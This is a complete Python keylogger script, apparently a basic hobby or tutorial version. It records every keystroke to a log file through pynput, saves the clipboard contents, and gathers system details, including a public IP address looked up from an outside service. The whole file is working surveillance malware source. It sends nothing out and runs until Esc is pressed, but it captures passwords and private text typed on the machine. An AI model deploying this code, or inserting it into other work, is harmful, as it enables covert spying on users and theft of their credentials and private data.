import socket
import platform
import pyperclip
from pynput.keyboard import Key, Listener
import time
from requests import get
import logging

logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')

keys_info_file = "key_log.txt"
system_info_file = "system_info.txt"
clipboard_info_file = "clipboard_info.txt"

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        public_ip = get("https://api.ipify.org").text
        processor = platform.processor()
        system = platform.system() + " " + platform.version()
        machine = platform.machine()

        with open(system_info_file, "w") as f:
            f.write(f"Public IP Address: {public_ip}\n")
            f.write(f"Processor: {processor}\n")
            f.write(f"System: {system}\n")
            f.write(f"Machine: {machine}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {ip}\n")

        logging.info("System information logged successfully.")
    except Exception as e:
        logging.error(f"Error logging system information: {e}")


def get_clipboard_info():
    try:
        pasted_data = pyperclip.paste()

        with open(clipboard_info_file, "a") as f:
            f.write(f"[Time: {time.time()}]: \n{pasted_data}\n")

        logging.info("Clipboard information logged successfully.")
    except Exception as e:
        logging.error(f"Error logging clipboard information: {e}")


def on_press(key):
    try:
        logging.info(f"Key pressed: {key}")
        if key == Key.esc:
            logging.info("KeyLogger closed.")
            return False
    except Exception as e:
        logging.error(f"Error processing key press: {e}")


def start_keylogger():
    try:
        with open(keys_info_file, "a") as f:
            f.write(f"[LOG [{time.time()}]]: KeyLogger Active.\n")
            f.write(f"[{time.time()}]\n")
            f.write("[LOG]: System Info Logged\n")
            f.write("[LOG]: ClipBoard Info Logged\n")

        logging.info("KeyLogger started.")

        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"Error starting keylogger: {e}")

if __name__ == "__main__":
    get_system_info()
    get_clipboard_info()
    start_keylogger()
